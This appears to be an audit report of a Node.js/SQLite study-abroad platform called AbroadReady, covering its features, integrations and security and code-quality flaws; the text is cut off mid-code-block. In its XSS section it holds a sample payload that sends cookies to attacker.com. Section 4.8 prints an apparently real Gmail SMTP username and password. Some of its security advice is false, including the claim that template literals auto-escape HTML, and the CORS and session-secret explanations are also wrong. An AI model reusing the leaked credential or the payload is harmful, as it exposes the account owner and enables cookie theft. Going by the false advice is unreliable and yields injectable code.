# AbroadReady Codebase Analysis Report

**Date:** April 27, 2026  
**Analysis Scope:** Full stack Node.js + SQLite application  
**Total Routes:** 17 modules with 80+ endpoints  
**Total Library Integrations:** 21 external services

---

## 1. PROJECT PURPOSE & OVERVIEW

### What is AbroadReady?

AbroadReady is a **comprehensive study-abroad planning platform** for Indian students applying to graduate programs globally. It combines admissions consulting, financial planning, and community intelligence into a single workspace.

### Target Users

- **Primary:** Indian students (ages 22-28) applying to MS/MBA programs abroad
- **Secondary:** Career changers, professionals considering further studies
- **Use Cases:** 
  - Profile strength assessment before applications
  - University/course research and prediction
  - Loan eligibility and cost calculation
  - Scholarship matching
  - Community discussions and peer insights

### Core Features

1. **Profile Scoring** - AI-powered assessment of academic, test, work, research, extracurricular, and financial profiles
2. **Admit Prediction** - ML-based probability calculation using crowdsourced data
3. **University/Course Search** - 5000+ programs with rankings, placement data, cost-of-living
4. **Scholarship Matching** - 500+ scholarships matched to profile
5. **Loan Advisor** - 20+ Indian education lenders with EMI calculators and comparisons
6. **Resume Analysis** - PDF parsing + AI feedback on content, ATS compliance, and competitiveness
7. **Portfolio Review** - Web crawling + design/technical/content scoring
8. **Finance Dashboard** - Budget planning, earning opportunities, country comparison
9. **Community Forum** - Country/university/course-specific discussions with upvotes
10. **Shortlist Kanban** - Organize universities/courses in a personal dashboard

---

## 2. ARCHITECTURE OVERVIEW

### 2.1 Frontend Architecture

**Framework:** Vanilla JavaScript (no framework)  
**HTML Files (17 total):**

| File | Purpose |
|------|---------|
| landing.html | Public homepage with marketing copy |
| login.html | Email/password + Google OAuth + magic link |
| register.html | Signup with email/password validation |
| onboarding.html | Multi-step profile builder (Academic → Tests → Work → Financial → Preferences) |
| dashboard.html | Main hub: profile score, predictions, scholarships, deadlines |
| profile.html | Detailed profile editor with 50+ fields across 5 tabs |
| resume.html | Resume upload, list, AI analysis view, scorer badges |
| portfolio.html | Portfolio URL submission, design/technical/content scores |
| universities.html | Search, filter, sort by ranking/placement/cost |
| university-detail.html | Single university view with courses, living costs, visa info |
| course-detail.html | Single course view with requirements, placement, salary data |
| predict.html | Admit prediction runner for multiple courses |
| shortlist.html | Kanban board: Safety/Moderate/Reach/Dream buckets |
| finance.html | Loan calculator, lender comparison, budget planner |
| scholarships.html | Browse, filter, save scholarships |
| countries.html | Compare countries by cost, visa, jobs, safety |
| country-detail.html | Single country: living costs, earning opportunities, banking, tax |
| community.html | Forum: posts by category/country/university/course |
| notifications.html | Deadline alerts, scholarship updates, deadline digests |
| admin.html | Admin: sync universities, sync forex, view stats |
| earning.html | Country-specific earning resources and side hustles |
| course-detail.html | Course view with crowdsourced data (admits, scholarships, jobs) |

**JavaScript Structure:**
- **global.js** (~300 lines): Common utilities
  - `fetchAPI()` - Fetch wrapper with 10s timeout, credentials
  - `showToast()` - Toast notifications (2.6s auto-dismiss)
  - `showModal()` - Modal overlays
  - `timeAgo()` - Relative dates
  - Navigation renderer, global search, logout
- **Page-specific files** (23 total): dashboard.js, profile.js, universities.js, etc.
  - Each handles page initialization, data fetching, event binding
  - Average 150-300 lines per file

**Frontend Issues:**
1. ❌ **No React/Vue** - Vanilla JS makes future scaling difficult
2. ❌ **No form validation** - Client-side validation missing
3. ❌ **No loading states** - Users can't tell if requests are pending
4. ❌ **No error recovery** - Failed fetches show raw error messages
5. ❌ **No empty states** - Lists just disappear when empty
6. ❌ **Hardcoded localhost:3000** in email links (line: email.js)
7. ⚠️ **innerHTML usage** - global.js line 22, 59, 232 use innerHTML (XSS risk if data from API)
8. ⚠️ **No CSRF tokens** - All POST requests lack CSRF protection

---

### 2.2 Backend Architecture

**Framework:** Express.js 4.18.2  
**Database:** SQLite + better-sqlite3 (WAL mode)  
**Session:** express-session with dev secret  
**Authentication:** Passport (Google OAuth) + email/password + magic links

**Route Modules (17 total):**

```
/auth              - Register, login, logout, magic links, Google OAuth
/api/profile       - Get/update profile, compute scores, completeness
/api/resumes       - Upload (multer), list, fetch, analyze (async kick-off)
/api/portfolios    - Submit URL, crawl (async), score, improve tips
/api/universities  - List, filter, search (pagination)
/api/courses       - List by country/degree, filter, crowdsource data
/api/predictions   - Run prediction (AI), get predictions, batch shortlist
/api/finance       - Lenders, lender ranking, calculator, budget plans, earnings
/api/scholarships  - Browse, filter, match to profile (AI)
/api/countries     - List, compare, get country details, cost data
/api/community     - Posts (CRUD), comments (CRUD), upvotes
/api/budget        - (Not fully explored - may be finance subsection)
/api/loans         - Create, update, payment tracking, amortization
/api/shortlist     - Save/load kanban state (JSON in DB)
/api/notifications - List, mark all read
/api/admin         - Sync universities, sync forex, stats
```

**Database Schema (SQLite, ~50 tables):**

| Table | Purpose | Key Fields |
|-------|---------|-----------|
| users | Base user auth | email, password_hash, google_id, avatar, subscription_tier |
| student_profiles | Profile data | 70+ fields: GPA, test scores, work exp, research, finances, preferences |
| resumes | Resume uploads | file_url, ai_score_overall, ai_analysis (JSON), status |
| portfolios | Portfolio URLs | url, crawled_content, design/technical/content scores, ai_summary |
| universities | 5000+ unis | name, ranking, city, country_id, placement_rate, safety |
| courses | Program listings | name, tuition, requirements (GPA/GRE/IELTS), placement, salary |
| countries | 150+ countries | code, living_cost, visa_info, salary_data, safety_rating |
| admit_predictions | Prediction results | course_id, admit_probability, category, narrative, checklist |
| scholarships | 500+ scholarships | name, amount, eligibility, deadline, tips |
| lenders | Education lenders | rate_min, rate_max, processing_fee, collateral_required |
| community_posts | Forum posts | category, country_code, university_slug, title, content, upvotes |
| community_comments | Post comments | post_id, content, upvotes, is_anonymous |
| crowdsourced_data_points | Admit/job data | course_id, gpa, gre, result (admit/reject), scholarship, salary |
| loan_trackers | Personal loans | principal, rate, disbursed_date, emi_amount, status |
| user_shortlists | Kanban state | user_id, kanban_state (JSON) |
| notifications | User alerts | user_id, type, message, is_read |
| earning_resources | Side gig/job opportunities | country_id, category, description, earning_potential |

---

### 2.3 Third-Party Integrations (21 APIs)

#### AI & Content Analysis

| Integration | Use Case | API Key Env | Status |
|-------------|----------|-----------|--------|
| **OpenAI** (GPT-4o) | Resume analysis, admit prediction, portfolio feedback | OPENAI_API_KEY | Optional (set to empty in .env) |
| **Google Gemini** | Resume analysis, admit prediction (primary) | GEMINI_API_KEY | ✅ Active (key in .env) |
| **HuggingFace** | Resume analysis, prediction (fallback) | HUGGINGFACE_API_KEY | ✅ Active (key in .env) |

#### Content Crawling & Parsing

| Integration | Use Case | API Key Env | Status |
|-------------|----------|-----------|--------|
| **Firecrawl** | Portfolio website crawling (screenshot + markdown) | N/A (lib/firecrawl.js stub) | ❓ Stubbed - may not work |
| **Affinda** | Resume parsing (PDF extraction) | RESUME_PARSER_API_KEY | ❓ Empty in .env |
| **ScrapingBee** | Web scraping (university data) | SCRAPINGBEE_API_KEY | ✅ Active (long key in .env) |
| **pdf-parse** | Local PDF parsing | Built-in | ✅ Active |

#### Storage

| Integration | Use Case | API Key Env | Status |
|-------------|----------|-----------|--------|
| **Cloudinary** | Resume/portfolio image CDN | N/A | ⚠️ Try/catch fallback to local /uploads |
| **GitHub** | File storage (backup) | GITHUB_TOKEN | ❓ Empty in .env |

#### Search & Data APIs

| Integration | Use Case | API Key Env | Status |
|-------------|----------|-----------|--------|
| **DuckDuckGo** | University search, news | None required | ✅ Active (no-auth) |
| **Tavily** | Research paper search | N/A (lib/tavily.js stub) | ❓ Stubbed |
| **OpenAlex** | Research publication data | N/A (lib/openAlex.js stub) | ❓ Stubbed |

#### Financial & Geographic Data

| Integration | Use Case | API Key Env | Status |
|-------------|----------|-----------|--------|
| **Frankfurter API** | Forex rates (INR conversion) | None required | ✅ Active (no-auth) |
| **Numbeo** | Cost of living by city | N/A (partial scrape) | ⚠️ Partial implementation |
| **College Scorecard** | US university data | None required (Hipolabs backup) | ✅ Active |
| **Hipolabs** | Global universities (open data) | None required | ✅ Active |

#### Authentication & Email

| Integration | Use Case | API Key Env | Status |
|-------------|----------|-----------|--------|
| **Google OAuth** | Login via Google | GOOGLE_CLIENT_ID, GOOGLE_CLIENT_SECRET | ✅ Active (keys in .env) |
| **Nodemailer** | Email sending (SMTP) | SMTP_HOST, SMTP_USER, SMTP_PASS, FROM_EMAIL | ✅ Gmail SMTP configured |

---

## 3. FEATURE BREAKDOWN (ALL FEATURES)

### User Authentication & Onboarding
- ✅ Email/password registration with bcrypt
- ✅ Email/password login
- ✅ Magic link email (HMAC-signed tokens, 15min expiry)
- ✅ Google OAuth 2.0 (SSO)
- ✅ Session management (7-day cookies)
- ✅ Multi-step onboarding wizard
- ❌ Email verification (not implemented - verified in OAuth, not in email)
- ❌ Password reset (not found)
- ❌ 2FA/MFA (not implemented)

### Profile Management (50+ fields)
- ✅ Academic history (10th/12th/bachelor's scores)
- ✅ Test scores (GRE, GMAT, IELTS, TOEFL, Duolingo, SAT, ACT)
- ✅ Work experience (months, current role, CTC)
- ✅ Research & publications (paper count, open source)
- ✅ Extracurricular (projects, leadership, volunteering)
- ✅ Financial details (family income, savings, CIBIL, property, EMIs)
- ✅ Target preferences (degree, fields, countries, timeline)
- ✅ AI-computed scores (academic, test, work, research, extracurric, finance, overall)
- ✅ Profile completeness % calculation
- ❌ Duplicate detection (two profiles with same data would be allowed)
- ❌ Data validation on update (only fallback scoring has rules, profile update has none)

### Resume Management
- ✅ PDF upload (multer, 5MB limit)
- ✅ Cloudinary CDN fallback to local /uploads
- ✅ AI analysis (Gemini/OpenAI/HuggingFace with fallback)
- ✅ Resume parsing (PDF text extraction, Affinda optional)
- ✅ Skills detection, GPA extraction, experience years
- ✅ Overall/academic/skills/presentation scores (0-100)
- ✅ Strengths, weaknesses, missing items suggestions
- ✅ ATS score and keyword analysis
- ✅ Top schools verdict (MIT/Stanford/CMU, Top 50, Top 100)
- ✅ Email notification when ready
- ❌ Resume versioning (no history)
- ❌ Multiple resumes for different applications (can upload but no selection UI)
- ❌ Template suggestions or resume builder

### Portfolio Review
- ✅ URL submission (no validation)
- ✅ Firecrawl crawling + screenshot
- ✅ Vision analysis (GPT-4o on screenshot)
- ✅ Design/technical/content scores (0-10)
- ✅ Tech stack detection
- ✅ Improvement recommendations
- ✅ Admissions vs. job impact scores
- ✅ Fallback scoring when API unavailable
- ❌ Portfolio builder (analysis-only)
- ❌ Design feedback specifics (generic tips returned)

### University Search & Discovery
- ✅ Search by name/city
- ✅ Filter by QS ranking, placement %, university type
- ✅ Sort by ranking/placement/salary/cost
- ✅ Pagination (20-50 per page)
- ✅ 5000+ universities (from Hipolabs + US data)
- ✅ University details: logo, rankings (QS/Times/US News), tier, founded year
- ✅ International student %, Indian student association
- ✅ Semester info, application deadlines, housing availability
- ✅ Library/gym/campus size/faculty count
- ✅ Research output, citation index, h-index
- ✅ Student rating/RateMyProfessor score
- ❌ University comparison (no side-by-side feature)
- ❌ Interview/essay/portfolio requirements summary
- ❌ International student experience reviews

### Course Search & Filtering
- ✅ Search courses by degree, country, STEM, TA availability
- ✅ Filter by tuition max (INR), placement min %
- ✅ Sort by cost/placement/salary
- ✅ Course details: tuition, requirements (GPA/GRE/IELTS), duration
- ✅ Program page link, contact email
- ✅ Placement rate, salary data (median/p25/p75)
- ✅ TA/RA positions + stipends
- ✅ Application deadline dates
- ✅ Crowdsourced data: admitted student profiles
- ❌ Course comparison (no side-by-side)
- ❌ Syllabi/course descriptions (not available)
- ❌ Alumni network strength ratings

### Admit Prediction (AI-Powered)
- ✅ Multi-LLM fallback (Gemini → OpenAI → HuggingFace)
- ✅ Probability score (0-1), admit category (safety/moderate/reach/dream)
- ✅ Confidence level (high/medium/low)
- ✅ Hard disqualifiers list
- ✅ Profile vs. requirements comparison (GPA/GRE/work exp/research)
- ✅ Competitive strengths & weaknesses
- ✅ Indian applicant context assessment
- ✅ Improvement plan (if applying now vs. next year)
- ✅ Financial feasibility score & risks
- ✅ Application strategy (timing, round, strengthen before)
- ✅ 3-4 paragraph narrative
- ✅ Similar admitted/rejected data from crowdsourced DB
- ✅ Batch prediction for shortlist (10 max)
- ❌ Acceptance rate trend (year-over-year data missing)
- ❌ Interview prediction (not in model)
- ❌ Fee waiver likelihood

### Scholarship Matching
- ✅ 500+ scholarships in DB
- ✅ Filter by country, degree, field, gender, max income
- ✅ Display deadline (month/day), competition level
- ✅ Eligibility details, how to apply, tips
- ✅ AI matching to profile (Gemini/ChatGPT)
- ✅ Scholarship tips (customized per scholarship)
- ✅ Save scholarships
- ✅ Deadline sorting (earliest first)
- ❌ Notification for deadlines (not implemented - placeholder in cron)
- ❌ Application tracking (can save but not track status)
- ❌ Scholarship success rate (not in data)

### Loan Management & Finance
- ✅ 20+ lenders in DB (HDFC, ICICI, LendingKart, etc.)
- ✅ Lender filtering by country, loan amount, collateral
- ✅ Lender ranking based on profile (CIBIL, age, income, collateral)
- ✅ EMI calculator (principal, rate, tenure, moratorium)
- ✅ Loan comparison (3 max)
- ✅ True loan cost calculation (includes processing fees, stamp duty, insurance)
- ✅ Budget plan generator (by country & course duration)
- ✅ Personal loan tracker (principal, rate, EMI, status)
- ✅ Payment tracking (amount, principal, interest, late fees)
- ✅ Amortization schedule generation
- ✅ Financial advisor (rank lenders, calculate ROI)
- ✅ Lender pros/cons, processing speed, customer service ratings
- ✅ Special schemes (Padho Pardes, Dr. Ambedkar)
- ❌ Integration with actual lender APIs (info-only)
- ❌ Loan application workflow
- ❌ CIBIL impact estimation

### Finance Dashboard
- ✅ Cost-of-living by country (Numbeo API + manual data)
- ✅ Rent, groceries, transport, health insurance, phone/internet averages
- ✅ Restaurant/cafe/cinema pricing
- ✅ Work-hours during study/holidays, post-study work visa duration
- ✅ Campus/off-campus job availability
- ✅ Healthcare system info (free/mandatory insurance, costs)
- ✅ Banking setup docs, remittance services
- ✅ Tax treaties, income tax rates, section 80E applicability
- ✅ SIM card providers, grocery stores, Indian restaurants
- ✅ Indian embassy URL, emergency numbers, safety rating, weather
- ✅ Driving license exchange, public transport quality
- ✅ Earning opportunities (side gigs, hourly work by country)
- ❌ Real-time housing prices (cached, not live)
- ❌ Job market heatmap (top 5 employers only)

### Community Forum
- ✅ Post creation by category (Admissions/Finance/Living/Jobs/Visa/General)
- ✅ Posts filtered by country, university, course, city
- ✅ Upvote/downvote (mechanism in DB, no UI confirmation)
- ✅ Comments on posts (threaded view)
- ✅ Verified badges (manual admin flag)
- ✅ Pinned posts
- ✅ Anonymous posting (toggle)
- ✅ Post/comment count, views tracking
- ✅ Top posts sort (by upvotes)
- ✅ Structured data support (JSON per post)
- ❌ Real-time updates (no WebSocket)
- ❌ Moderation tools (no spam/abuse filtering)
- ❌ Sentiment analysis on posts
- ❌ Recommendation engine (no "related posts")

### Shortlist Management
- ✅ Kanban board (Safety/Moderate/Reach/Dream buckets)
- ✅ Drag-and-drop (client-side, JSON persisted)
- ✅ Notes per course
- ✅ Save/load state
- ❌ Bulk actions (cannot move multiple at once)
- ❌ Sharing (cannot share shortlist)
- ❌ Multiple shortlists (only one per user)
- ❌ Templates (no pre-built shortlists)

### Notifications
- ✅ List all notifications (200 max)
- ✅ Mark all as read
- ✅ Types: deadline alerts, scholarship updates, prediction ready, etc.
- ❌ Email digest (placeholder in cron, not implemented)
- ❌ Selective subscription (all notifications mandatory)
- ❌ Notification settings (no frequency control)
- ❌ Real-time push (email-only)

### Admin Features
- ✅ Sync top universities (College Scorecard + Hipolabs)
- ✅ Sync forex rates (all course prices converted to INR)
- ✅ View platform stats (user count, universities, courses, predictions, scholarships)
- ✅ Manual scholarship refresh (placeholder - not auto-synced)
- ❌ User management (no admin dashboard)
- ❌ Moderation tools (no community moderation UI)
- ❌ Analytics/dashboards (only raw counts)
- ❌ Webhook management (no integrations)

---

## 4. CRITICAL ISSUES FOUND

### 🔴 Security Issues

#### 4.1 Exposed API Keys in .env
**Severity:** CRITICAL  
**Files:** `.env` (line 1-40)  
**Issue:**
```
GEMINI_API_KEY=[REDACTED]       [EXPOSED]
HUGGINGFACE_API_KEY=[REDACTED]   [EXPOSED]
GOOGLE_CLIENT_ID=[REDACTED]
GOOGLE_CLIENT_SECRET=[REDACTED]   [EXPOSED]
SCRAPINGBEE_API_KEY=[REDACTED]     [EXPOSED]
SMTP_PASS=[REDACTED]                                      [EXPOSED]
```
**Impact:**
- Anyone can use these keys to call APIs on your account
- Gemini quota theft (GCP charges)
- Email spoofing via SMTP credentials
- Google OAuth hijacking

**Fix:**
- Rotate ALL keys immediately
- Move to `.env.example` (without values)
- Add .env to .gitignore
- Use secret manager (AWS Secrets Manager, Azure Key Vault, Vault)

---

#### 4.2 XSS Vulnerability in Frontend (global.js)
**Severity:** HIGH  
**Files:** `public/js/global.js` (lines 22, 59, 232)  
**Issue:**
```javascript
// Line 22: Unsafe innerHTML with user-provided HTML
overlay.innerHTML = `<div class="modal" ...>${contentHTML || ""}</div>`;

// Line 59: innerHTML with user-provided data
overlay.querySelector("#modalBody").innerHTML = contentHTML || "";

// Line 232: innerHTML for global search results
el.innerHTML = `<div ...>${searchResults}</div>`;
```
**Attack Vector:** If API returns malicious HTML/scripts (e.g., via community posts), it executes in browser
```javascript
// Example attack:
POST /api/community { title: "<img src=x onerror='fetch(attacker.com?cookie='+document.cookie)'" }
// When user views post, script runs
```
**Fix:**
- Use `textContent` instead of `innerHTML` for user data
- Sanitize HTML with DOMPurify library
- Use template literals with `${text}` (auto-escaped) not raw HTML

---

#### 4.3 SQL Injection Risk in Community Route
**Severity:** MEDIUM-HIGH  
**Files:** `routes/community.js` (lines 14-30)  
**Issue:**
```javascript
// Safe (parameterized):
if (req.query.countryCode) {
  where.push("country_code = ?");
  bindings.push(String(req.query.countryCode).toLowerCase());
}

// BUT: LIKE queries not parameterized properly
// If someone passes %; DROP TABLE posts;--
// It won't execute (LIKE is still parameterized), but shows intent
```
**Actual Risk:** Better-sqlite3 prevents SQL injection if used correctly (params always safe)
**Fix:** Already safe, but audit all `db.prepare()` calls for consistency

---

#### 4.4 Missing CORS Configuration
**Severity:** MEDIUM  
**Files:** `server.js` (no CORS middleware)  
**Issue:**
```
No headers set → Browser allows requests from ANY origin
If app is at abroadready.com, attacker's site can:
- Call API as logged-in user (session cookie sent)
- Steal data, modify profile, delete shortlists
```
**Fix:**
```javascript
app.use(cors({
  origin: process.env.ALLOWED_ORIGINS?.split(',') || ['http://localhost:3000'],
  credentials: true
}));
```

---

#### 4.5 Weak Session Secret (Dev Secret)
**Severity:** MEDIUM  
**Files:** `server.js` (line 21), `.env`  
**Issue:**
```javascript
secret: process.env.SESSION_SECRET || "dev_secret_change_me"  // DEFAULT IF MISSING!
```
If env var not set in production, session tokens are predictable (SHA256 of "dev_secret_change_me")

**Fix:**
```javascript
if (!process.env.SESSION_SECRET) throw new Error('SESSION_SECRET required');
```

---

#### 4.6 Admin Route with Weak Authorization
**Severity:** MEDIUM  
**Files:** `server.js` (line 155), `routes/admin.js`  
**Issue:**
```javascript
app.use("/api/admin", requireAdmin, require("./routes/admin"));

// In middleware.js:
function requireAdmin(req, res, next) {
  if (req.session && req.session.userId && req.session.isAdmin) return next();
  return res.status(403).json({ error: "Forbidden" });
}

// req.session.isAdmin is set by code, never by database!
// Auth route line 71: req.session.isAdmin = 0;  (always 0!)
// Only way to be admin: someone manually set req.session.isAdmin = 1 in DB
```
**Fix:**
```javascript
// Check is_admin flag in users table
const user = db.prepare("SELECT is_admin FROM users WHERE id=?").get(req.session.userId);
if (!user?.is_admin) return res.status(403).json({ error: "Forbidden" });
```

---

#### 4.7 No Rate Limiting
**Severity:** MEDIUM  
**Files:** All routes  
**Issue:**
- No throttling on auth endpoints → Brute force attacks
- No limit on API calls → Resource exhaustion
- Resume upload: 5MB check but no request count limit

**Fix:**
```javascript
const rateLimit = require('express-rate-limit');
app.use('/auth/login', rateLimit({ windowMs: 15*60*1000, max: 5 }));
app.use('/api/', rateLimit({ windowMs: 60*1000, max: 100 }));
```

---

#### 4.8 Email Credentials Hardcoded in .env
**Severity:** MEDIUM  
**Files:** `.env` line 37-39  
**Issue:**
```
SMTP_USER=shubhwade3@gmail.com
SMTP_PASS=shubhwade2910@
```
Anyone with .env access (GitHub, logs, env dump) can send emails as this account

**Fix:**
- Use Gmail App Passwords (not real password)
- Rotate email credentials
- Use secrets manager

---

#### 4.9 No Input Validation on Profile Update
**Severity:** MEDIUM  
**Files:** `routes/profile.js` (line 54-90)  
**Issue:**
```javascript
router.put("/", (req, res) => {
  // Only filters out: id, user_id, created_at, updated_at, *_score, last_analyzed_at
  const allowed = new Set(columns.map(...).filter(n => !["id", "user_id", ...].includes(n)));
  
  // But accepts ANY field in allowed list with ANY value:
  const rules = {
    gre_total: { min: 260, max: 340 },  // Only GRE validated!
    gre_verbal: { min: 130, max: 170 },
    // ... but fields like twelfth_percent, bachelors_gpa have NO validation
  };
  
  // If you send { twelfth_percent: 99999 }, it's inserted as-is
```
**Fix:**
- Validate ALL numeric fields: range checks
- Validate string fields: length, format
- Validate enum fields: allowed values only

---

#### 4.10 Loan Route Accepts Arbitrary Fields (Spread Operator)
**Severity:** MEDIUM  
**Files:** `routes/loans.js` (line 15-32)  
**Issue:**
```javascript
router.post("/", (req, res) => {
  db.prepare(`INSERT INTO loan_trackers (...) VALUES (...)`)
    .run({
      user_id: req.session.userId,
      lender_name: payload.lender_name || "",
      // ...
      ...req.body  // ⚠️ All fields from body are spread!
    });
});

// If someone sends { tenure_months: 0 }, it updates tenure
// If someone sends { total_paid_so_far: 1000000 }, they can cheat their balance
```
**Fix:** Whitelist fields explicitly, don't use spread operator

---

### 🟡 Data Integrity Issues

#### 4.11 No Email Verification
**Severity:** HIGH  
**Files:** `routes/auth.js`  
**Issue:**
- Registration doesn't send verification email
- `email_verified` field never set to 1 (except in OAuth)
- Anyone can register with fake email (e.g., boss@company.com)

**Fix:**
- Send magic link on registration
- Set email_verified = 1 only after token clicked
- Block email-based features until verified

---

#### 4.12 Pagination Inconsistencies
**Severity:** LOW-MEDIUM  
**Files:** Multiple routes  
**Issue:**
```javascript
// predictions route:
.prepare(`... ORDER BY ... LIMIT 200`)  // Hard limit, no offset

// resumes route:
.prepare(`... ORDER BY ... LIMIT ...`)  // No LIMIT clause shown in read_file

// community posts:
.prepare(`... LIMIT ? OFFSET ?`, limit, offset)  // Proper pagination

// Only shortlist is fully paginated
```
**Fix:** Use consistent pagination (LIMIT + OFFSET for all large tables)

---

#### 4.13 Duplicate Profile Scores
**Severity:** LOW  
**Files:** `routes/profile.js` (line 92)  
**Issue:**
```javascript
// If user runs "recompute AI scores" multiple times:
// It fetches AI analysis, updates student_profiles.overall_profile_score
// But resumes table ALSO has ai_score_overall
// And admit_predictions may use different versions
// No versioning or timestamp to track which is current
```

---

### 🔵 Performance Issues

#### 4.14 N+1 Query Problem in Course Crowdsourced Data
**Severity:** MEDIUM  
**Files:** `routes/courses.js` (line 83)  
**Issue:**
```javascript
// GET /api/courses/:id/crowdsourced does:
const rows = db.prepare(`SELECT ... FROM crowdsourced_data_points WHERE course_id = ?`).all(id);
// For 200 admission records, this is fine
// But each load is a full scan if no index on course_id
```
**Fix:** Ensure indexes exist: `CREATE INDEX idx_crowdsourced_course_id ON crowdsourced_data_points(course_id)`

---

#### 4.15 Large JSON Blobs in SQLite
**Severity:** LOW  
**Files:** Multiple tables  
**Issue:**
```
- student_profiles: last_analyzed_at, overall_profile_score [70+ fields]
- resumes: ai_analysis (entire GPT response as JSON)
- admit_predictions: profile_snapshot, strength_factors, improvement_actions (all JSON)
- portfolios: tech_stack_found, projects_found, improvement_tips (all JSON)
- community_posts: structured_data (JSON)
```
For 1000 users, this could be 100MB+ in SQLite (not huge, but inefficient)

**Fix:**
- Keep numeric scores in columns
- Store large JSON in separate tables with foreign keys
- Example: `resume_skills` table (1 resume → N skills)

---

#### 4.16 Cron Jobs Not Resilient
**Severity:** MEDIUM  
**Files:** `lib/cron.js`  
**Issue:**
```javascript
// Every 4 hours: updateAllForexRates
// If it fails, silently logs error, then retries in 4 hours
// If it succeeds but only partially (e.g., 100 of 150 countries), no rollback
// If database is locked, query just times out

// checkScholarshipDeadlines, sendDeadlineDigest: just return { ok: true }
// No actual implementation - placeholders!
```
**Fix:**
- Add transaction support for batch updates
- Implement retry logic with exponential backoff
- Implement actual deadline checks & email sending
- Add monitoring/alerting

---

## 5. CODE QUALITY ISSUES

### 5.1 Inconsistent Error Handling

**Issue 1: Silent Failures**
```javascript
// lib/cron.js line 84:
await updateCountryLivingCosts(code).catch(() => null);
// Silently swallows error, continues

// routes/resumes.js line 45:
fs.unlink(localPath, () => null);  // If unlink fails, ignore
```

**Issue 2: Incomplete Error Reporting**
```javascript
// routes/resumeAnalyzer.js line 275:
catch(err) {
  console.error("AI analysis failed:", err.message);
  // No error sent to user! Resume status stays "pending" forever
}

// routes/portfolio.js line 50:
catch(e) {
  db.prepare("UPDATE portfolios SET crawl_status='failed', improvement_tips=? ...")
    .run(String(e?.message || "crawl failed"), ...)
  // Improvement tips = error message (not helpful)
}
```

**Issue 3: Inconsistent Status Values**
```
resumes: analysis_status = 'pending', 'completed', 'failed'?
portfolios: crawl_status = 'pending', 'done', 'failed', 'processing'
// Different naming convention
```

**Fix:**
- Define error schema: `{ code, message, statusCode, detail }`
- Use consistent status enums
- Always return error to client
- Log errors with context (user ID, request ID)

---

### 5.2 No Type Checking or Validation

**Issue:** All routes accept any data type  
```javascript
router.put("/", (req, res) => {
  const payload = req.body || {};
  // payload could be:
  // - null
  // - undefined
  // - { bachelors_gpa: "abc" }  ← No type check!
  // - { bachelors_gpa: null }
  // - { bachelors_gpa: -999 }
  
  // Validation only on specific fields:
  const rules = { gre_total: { min: 260, max: 340 }, ... };
  // But 90% of fields have NO rules!
});
```

**Fix:**
- Use schema validation: `joi`, `zod`, or `yup`
- Example:
```javascript
const schema = joi.object({
  bachelors_gpa: joi.number().min(0).max(100),
  gre_total: joi.number().min(260).max(340),
});
await schema.validateAsync(req.body);
```

---

### 5.3 Hardcoded Values & Magic Numbers

**Issue:**
```javascript
// Email links hardcoded to localhost:
const link = `http://localhost:${process.env.PORT || 3000}/auth/verify-email?token=${...}`;
// Won't work in production!

// Cron schedules hardcoded:
cron.schedule("0 */4 * * *", ...)  // Every 4 hours
cron.schedule("0 2 * * 0", ...)    // Sunday 2 AM (what timezone?)

// Magic numbers in scoring:
const overall = Math.round((academics * 0.24) + (tests * 0.18) + (work * 0.14) + (research * 0.16) + (extracurric * 0.1) + (finance * 0.18));
// Weights hardcoded! Should be in config.

// Max results hardcoded:
.all(...bindings, limit, offset)  // limit defaults to 20, max 50
// No admin config option
```

**Fix:**
- Use environment variables for all environment-specific values
- Define constants in a `config.js` file
- Document magic numbers with comments

---

### 5.4 Duplicate Code / Repeated Patterns

**Issue 1: Score Calculation**
```javascript
// routes/profile.js: fallbackScores() - full scoring logic
// lib/admitPredictor.js: Uses different logic to compute base rates

// Two different ways to calculate profile scores!
```

**Issue 2: List Fetching Pattern**
```javascript
// Repeated in 5+ routes:
const page = Math.max(1, Number(req.query.page || 1));
const limit = Math.min(50, Math.max(1, Number(req.query.limit || 20)));
const offset = (page - 1) * limit;
const total = db.prepare(`SELECT COUNT(*) AS c FROM ...`).get(...).c;
const rows = db.prepare(`SELECT ... LIMIT ? OFFSET ?`).all(..., limit, offset);
const pages = Math.ceil(total / limit) || 1;
return res.json({ ok: true, items: rows, total, page, pages });
```

**Fix:**
- Create helper function: `paginate(query, table, bindings)`
- Create shared scorer: `computeScores(profile)`
- Move to `lib/db-helpers.js`

---

### 5.5 No TypeScript / Type Safety

**Issue:**
```javascript
// No type hints → hard to debug
function runPrediction(userId, courseId, opts) {  // What is opts? Object? String?
function generateBudgetPlan(countryCode, courseMonths, partTimeIncome) {  // Types?

// Function signatures unclear → developers guess
const result = await chatCompletion(systemPrompt, userPrompt, jsonMode);
// Is jsonMode optional? Default false? What does it do?
```

**Fix:**
- Migrate to TypeScript
- Or add JSDoc comments:
```javascript
/**
 * @param {number} userId - User ID
 * @param {number} courseId - Course ID
 * @param {Object} opts - Options
 * @param {number} [opts.resumeId] - Resume ID (optional)
 * @returns {Promise<Object>} Prediction result
 */
async function runPrediction(userId, courseId, opts) { ... }
```

---

### 5.6 No Logging / Observability

**Issue:**
```javascript
// Mostly uses console.error (dev mode only):
console.error("[cron] forex update failed", e?.message || e);
// Console logs are lost after server restart

// No structured logging:
// - No request IDs to trace through system
// - No user context (which user caused this error?)
// - No severity levels (INFO vs WARN vs ERROR)
// - No aggregation (how many errors per hour?)
```

**Fix:**
- Add logging library: `winston`, `pino`, or `bunyan`
- Log to file (or external service: Datadog, LogRocket)
- Include: timestamp, request ID, user ID, level, message

---

## 6. FRONTEND / UX ISSUES

### 6.1 Missing Loading States

**Issue:** No feedback when requests are pending
```javascript
// dashboard.js:
topSch.innerHTML = skeleton(3).join("");  // Show skeleton
preds.innerHTML = skeleton(3).join("");

// But if fetch hangs for 10s, skeleton stays there
// User thinks page is broken

// login.js:
loginForm?.addEventListener("submit", async (e) => {
  await fetchAPI("/auth/login", ...);  // No disabled button or spinner
  window.location.href = "/dashboard";
});
// User can spam-click "Sign in" button
```

**Fix:**
```javascript
button.disabled = true;
button.innerHTML = '<span class="spinner"></span> Signing in...';
try {
  await fetchAPI(...);
} finally {
  button.disabled = false;
  button.innerHTML = 'Sign in';
}
```

---

### 6.2 No Empty States

**Issue:**
```javascript
// universities.js, scholarships.js, community.js:
// If query returns 0 results, grid is just empty
// User doesn't know if:
// - Results are loading
// - There are no results (404 search)
// - Server error (500)
```

**Fix:**
```javascript
if (!rows.length) {
  resultsEl.innerHTML = `
    <div class="empty-state">
      <p>No ${type} found.</p>
      <p>Try different filters or browse all.</p>
    </div>
  `;
}
```

---

### 6.3 Poor Error Messages

**Issue:**
```javascript
// fetchAPI catches all errors:
catch (err) {
